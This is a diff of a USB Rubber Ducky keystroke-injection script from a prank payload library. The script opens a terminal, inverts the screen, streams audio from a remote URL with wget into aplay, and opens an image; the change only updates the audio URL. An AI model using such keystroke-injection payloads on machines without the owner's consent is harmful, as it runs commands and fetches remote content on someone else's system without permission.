@@ -12,7 +12,7 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 2000
-STRING xrandr -o inverted && wget -q -O - https://keroserene.net/lol/roll.s16 2>/dev/null | aplay -Dplug:default -q -f S16_LE -r 8000 & open https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Inverted_desktop_troll/Rick/rick.png
+STRING xrandr -o inverted && wget -q -O - https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/RickRoll/TerminalRickRoll/roll.s16 2>/dev/null | aplay -Dplug:default -q -f S16_LE -r 8000 & open https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/RickRoll/Inverted_desktop_troll/Rick/rick.png
 DELAY 300
 ENTER
 DELAY 5000
